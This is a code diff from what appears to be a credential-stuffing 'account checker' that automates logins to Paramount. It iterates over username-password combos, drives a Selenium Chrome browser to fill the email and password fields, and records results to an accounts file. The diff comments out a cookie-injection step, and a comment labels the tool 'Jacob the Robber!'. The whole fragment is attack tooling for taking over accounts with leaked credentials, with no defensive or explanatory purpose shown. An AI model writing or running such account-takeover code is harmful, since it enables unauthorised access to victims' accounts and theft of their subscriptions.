@@ -35,16 +35,16 @@ def paramount_():
         with open(plain_directory + '/accounts/paramount_acc', 'a') as account_results:
             try:
                 print('\rTrying Combo {} out of {}'.format(index+1, len(users)),end='')
-                grab_cookies = GenerateCookies(page, plain_directory, 'paramount')
-                grab_cookies.create_headers()
-                cookies_dict = grab_cookies.create_cookies()
+                #grab_cookies = GenerateCookies(page, plain_directory, 'paramount')
+                #grab_cookies.create_headers()
+                #cookies_dict = grab_cookies.create_cookies()
                 browser = webdriver.Chrome(options=browser_options)
                 browser.set_window_size(500, 700)
                 browser.get(page)
                 time.sleep(5)
                 # a6121399-6ef9-447e-8653-8e223168a398 💀 Jacob the Robber!
-                for (k, v) in cookies_dict.items():
-                    browser.add_cookie({'name': k, 'value': v})
+                #for (k, v) in cookies_dict.items():
+                    #browser.add_cookie({'name': k, 'value': v})
                 email_input_box = browser.find_element(By.XPATH, '//*[@id="email"]')
                 password_input_box = browser.find_element(By.XPATH, '//*[@id="password"]')
                 sign_in_button = browser.find_element(By.XPATH, '//*[@id="sign-in-form"]/div/div[3]/button')
